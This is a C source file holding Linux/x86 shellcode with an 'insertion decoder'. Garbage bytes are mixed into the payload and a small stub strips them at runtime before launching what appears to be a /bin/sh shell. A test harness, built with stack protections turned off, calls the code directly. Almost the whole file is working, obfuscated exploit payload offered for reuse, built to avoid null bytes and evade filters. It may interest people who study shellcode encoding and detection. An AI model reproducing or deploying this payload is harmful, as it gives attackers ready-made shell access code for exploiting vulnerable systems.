/*

 Insertion Decoder Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   insertion_decoder_shellcode

  * decoder has 33 bytes (the final amount depends on the shellcode length plus garbage bytes)
  * null-free
  * decodes any pattern of garbage insertion
      Eg: True Byte = X, Garbage Byte = _
           _ X _ X _ ...
           X _ _ X X ...
           X X X _ _ ... 


   # gcc -m32 -fno-stack-protector -z execstack insertion_decoder_shellcode.c -o insertion_decoder_shellcode

   Testing
   # ./insertion_decoder_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

"\xeb\x1a\x5e\x8d\x3e\x31\xc9\x8b\x1c\x0e\x41\x66\x81\xfb\x80\x63\x74\x0f\x80\xfb\x3f\x74\xf0\x88\x1f\x47\xeb\xeb\xe8\xe1\xff\xff\xff\x31\x3f\x3f\xc9\x3f\x3f\xf7\x3f\x3f\x3f\xe1\x3f\x3f\xb0\x3f\x0b\x3f\x3f\x51\x3f\x3f\x68\x3f\x3f\x2f\x3f\x3f\x3f\x2f\x3f\x3f\x73\x3f\x68\x3f\x3f\x68\x3f\x3f\x2f\x3f\x3f\x62\x3f\x3f\x3f\x69\x3f\x3f\x6e\x3f\x89\x3f\x3f\xe3\x3f\x3f\xcd\x3f\x3f\x80\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x80\x63";

main ()
{

        // When contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(shellcode));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

		 // Calling the shellcode
		 "call shellcode");

}
